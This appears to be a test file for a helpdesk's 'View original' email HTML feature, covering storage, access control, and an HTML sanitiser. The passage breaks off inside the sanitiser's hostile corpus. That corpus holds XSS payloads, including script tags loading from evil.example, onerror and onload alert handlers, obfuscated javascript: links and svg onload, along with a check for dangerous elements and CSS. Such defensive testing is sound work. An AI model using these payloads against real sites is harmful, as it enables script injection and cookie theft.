// Helpdesk 1.20.8: "View original", an inbound email's HTML kept beside its
// message and shown to agents, sanitised (lib/helpdesk/email-html,
// email-html-sanitize, GET /api/helpdesk/messages/[id]/original).
//
//   - kept for every path a message comes in by email: a new ticket, the
//     requester's reply, an agent's reply, an agent's internal note by email,
//     a follow-up to a closed ticket, a forward, and a Microsoft 365 message
//     as an InboundEmail (the whole Graph path against the fake runs in
//     test/helpdesk-m365-mail, which owns the connection rig); quoted history
//     and forwarded content kept; nothing for mail without an HTML part; the
//     1 MB cap and its truncation; the providers' Content-IDs;
//   - who may open it: signed out, a requester, an agent of another team, an
//     internal note, a session that owes the desk its Duo approval, an
//     unlicensed helpdesk;
//   - the sanitiser against a hostile corpus, its bounds, remote pictures
//     (hidden by default, https only with Show images), cid pictures from the
//     same message only, and the response headers;
//   - privacy: anonymise, the retention purge, a removed account, the
//     personal data export; merge and the recycle bin keep it with its
//     message; the requester's read, the API (has_original_html) and the
//     upgrade path.
//
// Route handlers are called directly with real sessions (next/headers and
// lib/ee stubbed, as test/helpdesk-merge-bulk does). The Duo desk rule is
// stubbed for this process alone (what lib/auth reads from duo-policy), so
// the workspace's Duo settings are never touched. Parallel-safe: teams,
// people, tickets and files are this file's own (STAMP); the role matrix is
// read through the process-local test seam.
//
// Run: DATABASE_URL=… npx tsx --tsconfig ./tsconfig.test.json --test test/helpdesk-email-html.test.ts

import { test, before, after, describe } from "node:test";
import assert from "node:assert/strict";
import { lockWorkspaceMail, type WorkspaceMailLock } from "./support/mail-lock";
import Module from "node:module";
import path from "node:path";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { JSDOM, VirtualConsole } from "jsdom";
import { pool, getSetting, createSession } from "../src/lib/db";
import { newToken } from "../src/lib/password";
import { fixtureQuery } from "./support/retry";

// --- The request scope outside Next, the licence and the Duo rule -------------------

let currentRequest: Request | null = null;
let licensed = true;
/** Session tokens whose session owes the desk its Duo approval (this process only). */
const owesDuo = new Set<string>();

function cookieJar(): Map<string, string> {
  const jar = new Map<string, string>();
  for (const part of (currentRequest?.headers.get("cookie") ?? "").split(";")) {
    const i = part.indexOf("=");
    if (i > 0) jar.set(part.slice(0, i).trim(), decodeURIComponent(part.slice(i + 1).trim()));
  }
  return jar;
}

const HEADERS_STUB = path.join(__dirname, "stubs", "next-headers.helpdesk-email-html.virtual.js");
const EE_STUB = path.join(__dirname, "stubs", "ee.helpdesk-email-html.virtual.js");
const POLICY_STUB = path.join(__dirname, "stubs", "duo-policy.helpdesk-email-html.virtual.js");
const EE_REAL = path.join(__dirname, "..", "src", "lib", "ee");
const AUTH_REAL = path.join(__dirname, "..", "src", "lib", "auth.ts");
{
  const virtual = (file: string, exports: Record<string, unknown>) => {
    const m = new Module(file);
    m.filename = file;
    m.loaded = true;
    m.exports = exports;
    require.cache[file] = m;
  };
  virtual(HEADERS_STUB, {
    headers: async () => new Headers(currentRequest?.headers ?? {}),
    cookies: async () => {
      const jar = cookieJar();
      return {
        get: (name: string) => (jar.has(name) ? { name, value: jar.get(name) } : undefined),
        getAll: () => [...jar].map(([name, value]) => ({ name, value })),
        has: (name: string) => jar.has(name),
      };
    },
    draftMode: async () => ({ isEnabled: false }),
  });
  virtual(EE_STUB, {
    ee: () => ({ present: true, features: ["helpdesk"] }),
    eePresent: () => true,
    featureEnabled: async (feature: string) => licensed && feature === "helpdesk",
  });
  // The Duo desk rule for the session of the request in hand: lib/auth reads the rule from duo-policy, and a session
  // with no rule switched on gets DUO_NOTHING_OWED. For a session in `owesDuo` that answer says the desk is owed.
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const realPolicy = require("../src/lib/duo-policy") as typeof import("../src/lib/duo-policy");
  const owedNow = () => owesDuo.has(cookieJar().get("compass_session") ?? "");
  const policy: Record<string, unknown> = { ...realPolicy, duoSwitchedOn: (m: Record<string, string>) => !owedNow() && realPolicy.duoSwitchedOn(m) };
  Object.defineProperty(policy, "DUO_NOTHING_OWED", {
    enumerable: true,
    get: () => (owedNow() ? { signIn: false, desk: true, bypassed: false } : realPolicy.DUO_NOTHING_OWED),
  });
  virtual(POLICY_STUB, policy);
  const loader = Module as unknown as {
    _resolveFilename: (request: string, parent: { filename?: string } | null, ...rest: unknown[]) => string;
  };
  const resolveFilename = loader._resolveFilename;
  loader._resolveFilename = function (request: string, parent: { filename?: string } | null, ...rest: unknown[]) {
    if (request === "next/headers") return HEADERS_STUB;
    if (request === "@/lib/ee") return EE_STUB;
    if ((request === "./ee" || request === "../ee" || request === "../../ee") && parent?.filename && path.resolve(path.dirname(parent.filename), request) === EE_REAL) {
      return EE_STUB;
    }
    if (parent?.filename === AUTH_REAL && request === "./duo-policy") return POLICY_STUB;
    return resolveFilename.call(this, request, parent, ...rest);
  };
}

/* eslint-disable @typescript-eslint/no-require-imports */
const rolesShared = require("../src/lib/helpdesk/roles-shared") as typeof import("../src/lib/helpdesk/roles-shared");
const roles = require("../src/lib/helpdesk/roles") as typeof import("../src/lib/helpdesk/roles");
const dbCore = require("../src/lib/helpdesk/db-core") as typeof import("../src/lib/helpdesk/db-core");
const email = require("../src/lib/helpdesk/email") as typeof import("../src/lib/helpdesk/email");
const inbound = require("../src/lib/helpdesk/inbound") as typeof import("../src/lib/helpdesk/inbound");
const parse = require("../src/lib/helpdesk/inbound-parse") as typeof import("../src/lib/helpdesk/inbound-parse");
const m365Message = require("../src/lib/helpdesk/m365/message") as typeof import("../src/lib/helpdesk/m365/message");
const html = require("../src/lib/helpdesk/email-html") as typeof import("../src/lib/helpdesk/email-html");
const sanitize = require("../src/lib/helpdesk/email-html-sanitize") as typeof import("../src/lib/helpdesk/email-html-sanitize");
const worker = require("../src/lib/helpdesk/email-html-worker.cjs") as { cleanCss(css: string): string; cidKey(raw: string): string; SANITIZER_VERSION: number };
const shared = require("../src/lib/helpdesk/email-html-shared") as typeof import("../src/lib/helpdesk/email-html-shared");
const retention = require("../src/lib/helpdesk/retention") as typeof import("../src/lib/helpdesk/retention");
const retentionShared = require("../src/lib/helpdesk/retention-shared") as typeof import("../src/lib/helpdesk/retention-shared");
const bin = require("../src/lib/helpdesk/recycle-bin") as typeof import("../src/lib/helpdesk/recycle-bin");
const detail = require("../src/lib/helpdesk/detail") as typeof import("../src/lib/helpdesk/detail");
const tickets = require("../src/lib/helpdesk/tickets") as typeof import("../src/lib/helpdesk/tickets");
const apiTokens = require("../src/lib/helpdesk/api-tokens") as typeof import("../src/lib/helpdesk/api-tokens");
const dbLib = require("../src/lib/db") as typeof import("../src/lib/db");
const originalRoute = require("../src/app/api/helpdesk/messages/[id]/original/route") as typeof import("../src/app/api/helpdesk/messages/[id]/original/route");
const ticketRoute = require("../src/app/api/helpdesk/tickets/[number]/route") as typeof import("../src/app/api/helpdesk/tickets/[number]/route");
const mergeRoute = require("../src/app/api/helpdesk/tickets/merge/route") as typeof import("../src/app/api/helpdesk/tickets/merge/route");
const v1TicketRoute = require("../src/app/api/helpdesk/v1/tickets/[number]/route") as typeof import("../src/app/api/helpdesk/v1/tickets/[number]/route");
/* eslint-enable @typescript-eslint/no-require-imports */

import type { InboundEmail, InboundFile } from "../src/lib/helpdesk/inbound-parse";
import type { HdRole } from "../src/lib/helpdesk/roles-shared";

// --- Calling routes -------------------------------------------------------------------------

type Handler = (req: Request, ctx: { params: Promise<Record<string, string>> }) => Promise<Response>;

interface Answer {
  status: number;
  headers: Headers;
  text: string;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  body: any;
}

async function call(handler: unknown, r: Request, params: Record<string, string> = {}): Promise<Answer> {
  currentRequest = r;
  try {
    const res = await (handler as Handler)(r, { params: Promise.resolve(params) });
    const text = await res.text();
    let body: unknown = null;
    try {
      body = JSON.parse(text);
    } catch {
      body = null;
    }
    return { status: res.status, headers: res.headers, text, body };
  } finally {
    currentRequest = null;
  }
}

function req(url: string, session: string | null, init: { method?: string; body?: unknown } = {}): Request {
  const headers: Record<string, string> = { "content-type": "application/json", host: "localhost" };
  if (session) headers.cookie = `compass_session=${session}`;
  return new Request(`http://localhost/api/helpdesk${url}`, {
    method: init.method ?? (init.body === undefined ? "GET" : "POST"),
    headers,
    body: init.body === undefined ? undefined : JSON.stringify(init.body),
  });
}

/** GET the original (the frame's document, or ?format=info) as `who`. */
function original(messageId: number, session: string | null, query = ""): Promise<Answer> {
  html.resetOriginalCacheForTests();
  return call(originalRoute.GET, req(`/messages/${messageId}/original${query}`, session), { id: String(messageId) });
}

// --- Fixtures ---------------------------------------------------------------------------------

const STAMP = `hdhtml${Date.now().toString(36)}${process.pid}`;
const HELP = `${STAMP}-it@desk.example`; // T1's email alias is its local part
interface Person {
  id: number;
  session: string;
  name: string;
  email: string;
}
const P: Record<string, Person> = {};
const userIds: number[] = [];
const roleIds: number[] = [];
const tokenIds: number[] = [];
let T1 = 0;
let T2 = 0;
let uploads = "";
const sent: { to: string; subject: string }[] = [];

async function person(key: string, name: string): Promise<Person> {
  const addr = `${STAMP}-${key}@people.example`;
  const r = await fixtureQuery(`INSERT INTO users (username, name, email, role, status) VALUES ($1, $2, $3, 'viewer', 'active') RETURNING id`, [`${STAMP}-${key}`, name, addr]);
  const id = r.rows[0].id as number;
  const session = newToken();
  await createSession(session, id, new Date(Date.now() + 3_600_000).toISOString());
  userIds.push(id);
  P[key] = { id, session, name, email: addr };
  return P[key];
}

async function grant(userId: number, perms: string[], tag: string): Promise<void> {
  const r = await fixtureQuery("INSERT INTO roles (key, name) VALUES ($1, $1) RETURNING id", [`${STAMP}-${tag}`]);
  roleIds.push(r.rows[0].id);
  for (const p of perms) await fixtureQuery("INSERT INTO role_permissions (role_id, permission) VALUES ($1, $2)", [r.rows[0].id, p]);
  await fixtureQuery("INSERT INTO role_assignments (role_id, user_id, scope_type) VALUES ($1, $2, 'global')", [r.rows[0].id, userId]);
}

async function deskRole(userId: number, role: HdRole) {
  await pool().query("INSERT INTO hd_agent_roles (user_id, role) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET role = EXCLUDED.role", [userId, role]);
}
async function member(teamId: number, userId: number) {
  await pool().query("INSERT INTO hd_team_members (team_id, user_id, role) VALUES ($1, $2, 'agent') ON CONFLICT DO NOTHING", [teamId, userId]);
}

let seq = 0;
/** An inbound email, as a provider's parse would hand it over. */
function mail(from: Person | { email: string; name: string }, over: Partial<InboundEmail> = {}): InboundEmail {
  seq++;
  return {
    provider: "generic",
    from: { email: from.email, name: from.name },
    to: [{ email: HELP, name: "IT help" }],
    cc: [],
    recipients: [],
    subject: `${STAMP} subject ${seq}`,
    text: "",
    html: "",
    stripped: "",
    messageId: `${STAMP}-${seq}@mail.people.example`,
    inReplyTo: "",
    references: [],
    headers: {},
    files: [],
    ...over,
  };
}

/** Run the pipeline as the inbound webhook does after parsing: the sender's address trusted (no verdict), outside senders off. */
async function deliver(e: InboundEmail) {
  // Many mails from the same few people: the per-sender limit (20 in 10 minutes) is not under test here.
  inbound.resetInboundRateLimitsForTests();
  const r = await inbound.processInboundEmail(e, { origin: "http://localhost", outsideSenders: false, trustUnverified: true });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  return r.body;
}

const ticketByNumber = async (n: number) => (await pool().query("SELECT * FROM hd_tickets WHERE number = $1", [n])).rows[0];
const messagesOf = async (ticketId: number) =>
  (await pool().query("SELECT id, kind, body, via, author_id FROM hd_messages WHERE ticket_id = $1 AND via <> 'system' ORDER BY id", [ticketId])).rows as {
    id: number;
    kind: string;
    body: string;
    via: string;
    author_id: number | null;
  }[];
const stored = async (messageId: number) => (await pool().query("SELECT * FROM hd_message_html WHERE message_id = $1", [messageId])).rows[0];

/** A minimal PNG (sniffImage reads its signature and IHDR), padded to `size` bytes. */
function png(size: number): Buffer {
  const head = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0x0d, 0x49, 0x48, 0x44, 0x52, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0]);
  return Buffer.concat([head, Buffer.alloc(Math.max(0, size - head.length), 7)]);
}

const QUOTED = `<div dir="ltr"><p>Still broken after the restart.</p></div>
<div class="gmail_quote"><div class="gmail_attr">On Mon, Ana wrote:</div><blockquote class="gmail_quote" style="margin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">Please restart the laptop.</blockquote></div>`;

let mailLock: WorkspaceMailLock | null = null;

before(async () => {
  // This file sends helpdesk mail through the workspace's mail configuration (test/support/mail-lock).
  mailLock = await lockWorkspaceMail("shared");
  await getSetting("__schema_bootstrap__");
  uploads = await mkdtemp(path.join(tmpdir(), "compass-email-html-"));
  process.env.COMPASSDOCS_UPLOAD_DIR = uploads;
  roles.setRoleMatrixForTests(rolesShared.HD_DEFAULT_MATRIX);
  for (const [k, n] of [
    ["agent", "Ana Kowalski"],
    ["agent2", "Abe Lindqvist"],
    ["other", "Oda Otherteam"],
    ["manager", "Mina Park"], // a desk Admin: may delete (bin) tickets
    ["req", "Daniel Okafor"],
    ["req2", "Priya Shah"],
    ["leaver", "Lena Moreau"],
  ] as const) {
    await person(k, n);
  }
  T1 = (await fixtureQuery("INSERT INTO hd_teams (name, position, email_alias) VALUES ($1, 9301, $2) RETURNING id", [`${STAMP} IT`, `${STAMP}-it`])).rows[0].id;
  T2 = (await fixtureQuery("INSERT INTO hd_teams (name, position) VALUES ($1, 9302) RETURNING id", [`${STAMP} HR`])).rows[0].id;
  for (const k of ["agent", "agent2", "other"]) await deskRole(P[k].id, "agent");
  await deskRole(P.manager.id, "admin");
  await member(T1, P.agent.id);
  await member(T1, P.agent2.id);
  await member(T1, P.manager.id);
  await member(T2, P.other.id);
  for (const k of ["agent", "agent2", "other", "manager", "req", "req2", "leaver"]) await grant(P[k].id, ["helpdesk.request"], k);
  email.setHelpdeskTransportForTests(async (m) => {
    sent.push({ to: m.to, subject: m.subject });
  });
  inbound.resetInboundRateLimitsForTests();
});

after(async () => {
  await sanitize.stopSanitizeWorkerForTests();
  roles.setRoleMatrixForTests(null);
  email.setHelpdeskTransportForTests(null);
  inbound.setInboundAttachmentStoreForTests(null);
  const all = (
    await pool().query("SELECT id FROM hd_tickets WHERE team_id = ANY($1) OR requester_id = ANY($2) OR subject LIKE $3", [[T1, T2], userIds, `%${STAMP}%`])
  ).rows.map((r) => r.id);
  await pool().query("UPDATE hd_tickets SET merged_into = NULL WHERE id = ANY($1)", [all]);
  await pool().query("DELETE FROM hd_attachments WHERE ticket_id = ANY($1)", [all]);
  await pool().query("DELETE FROM hd_tickets WHERE id = ANY($1)", [all]);
  await pool().query("DELETE FROM hd_teams WHERE id = ANY($1)", [[T1, T2]]);
  const principals = tokenIds.length ? (await pool().query("SELECT principal_id FROM hd_api_tokens WHERE id = ANY($1)", [tokenIds])).rows.map((r) => r.principal_id) : [];
  await pool().query("DELETE FROM hd_api_tokens WHERE id = ANY($1)", [tokenIds]);
  const everyone = [...userIds, ...principals];
  await pool().query("DELETE FROM notifications WHERE user_id = ANY($1)", [everyone]);
  await pool().query("DELETE FROM audit_log WHERE actor_id = ANY($1) OR (target_type = 'helpdesk_ticket' AND target_id = ANY($2))", [everyone, all.map(String)]);
  await pool().query("DELETE FROM audit_log WHERE action = 'helpdesk.api_token.created' AND target_label LIKE $1", [`${STAMP}%`]);
  await pool().query("DELETE FROM sessions WHERE user_id = ANY($1)", [everyone]);
  await pool().query("DELETE FROM role_assignments WHERE user_id = ANY($1)", [everyone]);
  await pool().query("DELETE FROM hd_agent_roles WHERE user_id = ANY($1)", [everyone]);
  await pool().query("DELETE FROM roles WHERE id = ANY($1)", [roleIds]);
  await fixtureQuery("DELETE FROM users WHERE id = ANY($1)", [everyone]);
  await rm(uploads, { recursive: true, force: true });
  await mailLock?.release(email);
  await pool().end();
});

// --- Keeping it ----------------------------------------------------------------------------------

/** The ticket and its first message opened by `e`. */
async function opened(e: InboundEmail) {
  const r = await deliver(e);
  assert.ok(r.ticket, JSON.stringify(r));
  const t = await ticketByNumber(r.ticket!);
  const [first] = await messagesOf(t.id);
  return { r, t, first };
}

describe("keeping the HTML part", () => {
  test("a new ticket: the HTML is kept as it arrived, quoted history and all; the body stays the text it always was", async () => {
    const raw = `<html><head><style>p{color:#123456}</style></head><body><p>My <b>laptop</b> will not start.</p>${QUOTED}</body></html>`;
    const { r, t, first } = await opened(mail(P.req, { html: raw, text: "My laptop will not start." }));
    assert.equal(r.outcome, "created");
    assert.equal(t.team_id, T1);
    assert.equal(first.body, "My laptop will not start.");
    const row = await stored(first.id);
    assert.equal(row.html, raw, "stored raw, never sanitised at rest");
    assert.equal(row.size, Buffer.byteLength(raw));
    assert.equal(row.truncated, false);
    assert.deepEqual(row.cids, {});
    // The agent's read says so; the requester's never does.
    const d = await call(ticketRoute.GET, req(`/tickets/${t.number}`, P.agent.session), { number: String(t.number) });
    assert.equal(d.status, 200);
    assert.equal(d.body.messages.find((m: { id: number }) => m.id === first.id).has_original_html, true);
    const full = await tickets.getTicketById(t.id);
    const mine = await detail.requestDetail(P.req, full!, "requester");
    assert.ok(mine.messages.length > 0);
    for (const m of mine.messages) assert.equal("has_original_html" in m, false, "the requester's read never carries it");
  });

  test("replies: the requester's (quoted history kept in the HTML, cut from the text), an agent's, and an agent's internal note by email", async () => {
    const { t } = await opened(mail(P.req, { html: "<p>Printer jams on page 2.</p>" }));
    const ref = `Re: ${t.subject} [#${t.number} ref:${t.reply_token}]`;
    const fromReq = await deliver(mail(P.req, { subject: ref, html: QUOTED }));
    assert.equal(fromReq.outcome, "appended");
    const fromAgent = await deliver(mail(P.agent, { subject: ref, html: "<p>I have ordered a <i>new</i> drum.</p>" }));
    assert.equal(fromAgent.outcome, "appended");
    const note = await deliver(mail(P.agent, { subject: ref, inReplyTo: `<hd-note-${t.reply_token}-abcdef@desk.example>`, html: "<p>Supplier says <u>Friday</u>.</p>" }));
    assert.equal(note.outcome, "appended");
    const msgs = await messagesOf(t.id);
    assert.equal(msgs.length, 4);
    const [, reqReply, agentReply, internal] = msgs;
    assert.equal(reqReply.body, "Still broken after the restart.", "the text drops the quote");
    assert.match((await stored(reqReply.id)).html, /Please restart the laptop\./, "the HTML keeps it");
    assert.deepEqual([agentReply.kind, agentReply.author_id], ["public", P.agent.id]);
    assert.match((await stored(agentReply.id)).html, /<i>new<\/i>/);
    assert.deepEqual([internal.kind, internal.author_id], ["internal", P.agent.id]);
    assert.match((await stored(internal.id)).html, /<u>Friday<\/u>/);
  });

  test("a follow-up to a closed ticket and a forward: both keep their HTML, the forwarded message included", async () => {
    const { t } = await opened(mail(P.req, { html: "<p>VPN drops every hour.</p>" }));
    await pool().query("UPDATE hd_tickets SET status = 'closed', closed_at = now() WHERE id = $1", [t.id]);
    const follow = await deliver(mail(P.req, { subject: `Re: ${t.subject} [#${t.number} ref:${t.reply_token}]`, html: `<p>It is back.</p>${QUOTED}` }));
    assert.equal(follow.outcome, "follow_up");
    assert.notEqual(follow.ticket, t.number);
    const ft = await ticketByNumber(follow.ticket!);
    const [fm] = await messagesOf(ft.id);
    assert.match(fm.body, /Follow-up to #/);
    assert.match((await stored(fm.id)).html, /It is back\.[\s\S]*Please restart the laptop/);

    const forwarded = `<p>Can you look at this one?</p><div class="gmail_quote"><div dir="ltr" class="gmail_attr">---------- Forwarded message ---------<br>From: <strong>Vendor Billing</strong> &lt;billing@vendor.example&gt;<br>Subject: Invoice 2231</div><br><table width="600"><tr><td style="font-family:Georgia">Invoice <b>2231</b> is overdue.</td></tr></table></div>`;
    const fwd = await opened(mail(P.agent, { subject: "Fwd: Invoice 2231", html: forwarded }));
    assert.equal(fwd.r.outcome, "created");
    const row = await stored(fwd.first.id);
    assert.equal(row.html, forwarded);
    // And it shows: the forwarded content is in the sanitised document.
    const doc = await original(fwd.first.id, P.agent.session);
    assert.equal(doc.status, 200);
    assert.match(doc.text, /Forwarded message/);
    assert.match(doc.text, /Invoice <b>2231<\/b> is overdue\./);
    assert.match(doc.text, /font-family:Georgia/);
  });

  test("mail without an HTML part stores nothing, shows no control and answers 404", async () => {
    const { first, t } = await opened(mail(P.req, { text: "Plain text only, please." }));
    assert.equal(await stored(first.id), undefined);
    const d = await call(ticketRoute.GET, req(`/tickets/${t.number}`, P.agent.session), { number: String(t.number) });
    assert.equal(d.body.messages.find((m: { id: number }) => m.id === first.id).has_original_html, false);
    const r = await original(first.id, P.agent.session, "?format=info");
    assert.equal(r.status, 404);
    // Whitespace alone is no HTML part either.
    const blank = await opened(mail(P.req, { text: "Hi", html: "  \n " }));
    assert.equal(await stored(blank.first.id), undefined);
  });

  test("the 1 MB cap: the first part is kept, never half a character, and marked truncated; the view says so", async () => {
    const big = `<p>${"Grüße aus Köln. ".repeat(80_000)}</p>`;
    assert.ok(Buffer.byteLength(big) > shared.EMAIL_HTML_LIMITS.storeBytes);
    const { first } = await opened(mail(P.req, { html: big, text: "Long one" }));
    const row = await stored(first.id);
    assert.equal(row.truncated, true);
    assert.equal(row.size, Buffer.byteLength(big));
    assert.ok(Buffer.byteLength(row.html) <= shared.EMAIL_HTML_LIMITS.storeBytes);
    assert.ok(Buffer.byteLength(row.html) > shared.EMAIL_HTML_LIMITS.storeBytes - 4);
    assert.ok(!row.html.includes("\uFFFD"), "cut on a character boundary");
    assert.ok(big.startsWith(row.html));
    const info = await original(first.id, P.agent.session, "?format=info");
    assert.equal(info.status, 200, info.text);
    assert.deepEqual([info.body.ok, info.body.truncated, info.body.size], [true, true, Buffer.byteLength(big)]);
    // The pure helper, at the edge.
    assert.deepEqual(html.truncateUtf8("aé", 2), { text: "a", size: 3, truncated: true });
    assert.deepEqual(html.truncateUtf8("aé", 3), { text: "aé", size: 3, truncated: false });
  });

  test("the providers' Content-IDs reach the inline pictures (generic, Postmark, SendGrid, Mailgun)", async () => {
    const g = parse.parseGeneric({ from: "a@b.example", html: "<img src='cid:x1'>", attachments: [{ filename: "x.png", content_type: "image/png", content: "AAAA", content_id: "<x1@b>" }] });
    assert.equal(g.files[0].contentId, "x1@b");
    const p = parse.parsePostmark({ From: "a@b.example", HtmlBody: "<img>", Attachments: [{ Name: "x.png", ContentType: "image/png", Content: "AAAA", ContentID: "image001.png@01DA" }] });
    assert.equal(p.files[0].contentId, "image001.png@01DA");
    const sg = new FormData();
    sg.set("from", "a@b.example");
    sg.set("html", "<img src=cid:ii_abc>");
    sg.set("attachments", "1");
    sg.set("attachment-info", JSON.stringify({ attachment1: { filename: "s.png", type: "image/png", "content-id": "ii_abc" } }));
    sg.set("attachment1", new File([new Uint8Array(png(5000))], "s.png", { type: "image/png" }));
    assert.equal((await parse.parseSendgrid(sg)).files[0].contentId, "ii_abc");
    const mg = new FormData();
    mg.set("from", "a@b.example");
    mg.set("body-html", "<img src=cid:part1>");
    mg.set("attachment-count", "2");
    mg.set("content-id-map", JSON.stringify({ "<part1.mg@b>": "attachment-2" }));
    mg.set("attachment-1", new File([new Uint8Array(Buffer.from("%PDF-1.4"))], "a.pdf"));
    mg.set("attachment-2", new File([new Uint8Array(png(5000))], "b.png"));
    const mgFiles = (await parse.parseMailgun(mg)).files;
    assert.deepEqual(mgFiles.map((f) => f.contentId), [undefined, "part1.mg@b"]);
  });

  test("Microsoft 365: a Graph message (HTML body, an inline picture with its contentId) is kept the same way", async () => {
    const graph = {
      id: "AAMk-1",
      internetMessageId: `<${STAMP}-graph@people.example>`,
      subject: `${STAMP} From Outlook`,
      from: { emailAddress: { address: P.req.email, name: P.req.name } },
      toRecipients: [{ emailAddress: { address: HELP, name: "" } }],
      body: { contentType: "html", content: '<html><body><p>Screenshot below.</p><img src="cid:image001.png@01DB"></body></html>' },
      internetMessageHeaders: [],
    };
    const files: InboundFile[] = [{ name: "image001.png", type: "image/png", data: png(6000), contentId: "image001.png@01DB" }];
    const conv = m365Message.graphMessageToInbound(graph, files, [HELP]);
    assert.ok(conv);
    assert.equal(conv!.email.html, graph.body.content, "the InboundEmail's html is Graph's HTML body");
    const { first } = await opened(conv!.email);
    const row = await stored(first.id);
    assert.equal(row.html, graph.body.content);
    const att = (await pool().query("SELECT id FROM hd_attachments WHERE message_id = $1", [first.id])).rows[0];
    assert.deepEqual(row.cids, { "image001.png@01db": { attachment_id: Number(att.id) } });
    const doc = await original(first.id, P.agent.session);
    assert.match(doc.text, /<img referrerpolicy="no-referrer" src="data:image\/png;base64,/);
    // A text body from Graph keeps nothing.
    const plain = m365Message.graphMessageToInbound({ ...graph, internetMessageId: `<${STAMP}-graph2@people.example>`, body: { contentType: "text", content: "Hello" } }, [], [HELP]);
    assert.equal(plain!.email.html, "");
  });
});

// --- Who may open it ------------------------------------------------------------------------------

describe("who may open it", () => {
  let msgId = 0;
  let noteId = 0;
  let number = 0;
  before(async () => {
    const { t, first } = await opened(mail(P.req, { html: "<p>Who can see me?</p>" }));
    msgId = first.id;
    number = t.number;
    await deliver(mail(P.agent, { subject: `Re: [#${t.number} ref:${t.reply_token}]`, inReplyTo: `<hd-note-${t.reply_token}-0a0b0c@desk.example>`, html: "<p>Agents only.</p>" }));
    noteId = (await messagesOf(t.id)).find((m) => m.kind === "internal")!.id;
    assert.ok(await stored(noteId));
  });

  test("an agent who works the ticket: the email and the internal note (as the desk shows them)", async () => {
    for (const id of [msgId, noteId]) {
      const r = await original(id, P.agent.session);
      assert.equal(r.status, 200, r.text);
      assert.match(r.headers.get("content-type") ?? "", /^text\/html/);
    }
    assert.match((await original(noteId, P.agent2.session)).text, /Agents only\./);
    assert.equal((await original(msgId, P.manager.session)).status, 200, "every team's tickets");
  });

  test("signed out 401; the requester (their own ticket) 403; an agent of another team 404; unknown ids 404", async () => {
    assert.equal((await original(msgId, null)).status, 401);
    for (const id of [msgId, noteId]) {
      const r = await original(id, P.req.session);
      assert.equal(r.status, 403, "Get help never reaches it");
      assert.ok(!r.text.includes("Who can see me") && !r.text.includes("Agents only"));
    }
    for (const id of [msgId, noteId]) assert.equal((await original(id, P.other.session)).status, 404);
    for (const id of ["0", "-1", "abc", "99999999999", String(2_147_483_000)]) {
      currentRequest = null;
      const r = await call(originalRoute.GET, req(`/messages/${id}/original`, P.agent.session), { id });
      assert.equal(r.status, 404, id);
    }
  });

  test("a session that owes the desk its Duo approval: 401 mfa_required, nothing of the email", async () => {
    owesDuo.add(P.agent.session);
    try {
      const r = await original(msgId, P.agent.session);
      assert.equal(r.status, 401);
      assert.equal(r.body.code, "mfa_required");
      assert.ok(!r.text.includes("Who can see me"));
    } finally {
      owesDuo.delete(P.agent.session);
    }
    assert.equal((await original(msgId, P.agent.session)).status, 200, "and once it is given, the same agent reads it");
  });

  test("unlicensed: 402", async () => {
    licensed = false;
    try {
      assert.equal((await original(msgId, P.agent.session)).status, 402);
    } finally {
      licensed = true;
    }
  });

  test("a ticket in the recycle bin: 404 while it is there; restored, the HTML is still with its message", async () => {
    const manager = (await dbLib.getUserById(P.manager.id))!;
    const [b] = await bin.binTickets(manager, [number]);
    assert.ok(b.ok, JSON.stringify(b));
    assert.equal((await original(msgId, P.manager.session)).status, 404);
    assert.ok(await stored(msgId), "kept while binned");
    const [r] = await bin.restoreTickets(manager, [number]);
    assert.ok(r.ok, JSON.stringify(r));
    assert.equal((await original(msgId, P.agent.session)).status, 200);
  });
});

// --- The sanitiser ----------------------------------------------------------------------------------

describe("the sanitiser", () => {
  const clean = async (h: string, opts: Parameters<typeof sanitize.sanitizeEmailHtml>[1] = {}) => {
    const r = await sanitize.sanitizeEmailHtml(h, opts);
    assert.equal(r.ok, true, h);
    return r as Extract<typeof r, { ok: true }>;
  };
  /** The email's own part of the document (after our head). */
  const bodyOf = async (h: string, opts?: Parameters<typeof sanitize.sanitizeEmailHtml>[1]) => (await clean(h, opts)).html.replace(/^[\s\S]*?<\/head>/, "");
  /**
   * Nothing in the output can run or load, read the way a browser reads it
   * (parsed again, as the frame will): no script, frame, form, meta refresh,
   * base or link element, no on* attribute, no javascript:/data: address but
   * a picture's, no CSS that loads.
   */
  const inert = (out: string) => {
    const doc = new JSDOM(out, { virtualConsole: new VirtualConsole() }).window.document;
    const bad = doc.querySelectorAll("script,iframe,frame,frameset,object,embed,applet,form,input,button,select,textarea,base,link,svg,math,template,noscript,audio,video,source");
    assert.equal(bad.length, 0, out);
    const metas = [...doc.querySelectorAll("meta")].map((m) => m.outerHTML);
    assert.deepEqual(metas, ['<meta charset="utf-8">', '<meta name="referrer" content="no-referrer">'], out);
    for (const el of doc.querySelectorAll("*")) {
      for (const a of el.getAttributeNames()) {
        assert.ok(!/^on/i.test(a), `${a} on ${el.tagName}: ${out}`);
        const v = el.getAttribute(a) ?? "";
        if (a === "href") assert.match(v, /^(https?:|mailto:|tel:|#)/i, out);
        if (a === "src") assert.match(v, /^(https:|data:image\/(png|jpeg|gif|webp);base64,)/i, out);
        if (a === "style") assert.doesNotMatch(v, /url\(|expression\(|@import|image-set\(/i, out);
      }
    }
    for (const st of doc.querySelectorAll("style")) assert.doesNotMatch(st.textContent ?? "", /url\(|expression\(|@import|behavior|binding|image-set\(/i, out);
  };

  const CORPUS: [string, string][] = [
    ["script", `<p>Hi</p><script>document.cookie</script><SCRIPT SRC=//evil.example/x.js></SCRIPT>`],
    ["onerror", `<img src=x onerror=alert(1)><body onload=alert(2)><div onmouseover="alert(3)">x</div>`],
    ["javascript links", `<a href="javascript:alert(1)">a</a><a href=" JaVaScRiPt:alert(1)">b</a><a href="java&#x09;script:alert(1)">c</a><a href="&#106;avascript:alert(1)">d</a><a href="vbscript:x">e</a>`],
    ["svg onload", `<svg onload=alert(1)><circle r=4 /></svg><svg><script>alert(1)</script><animate onbegin=alert(1) attributeName=x></svg>`],
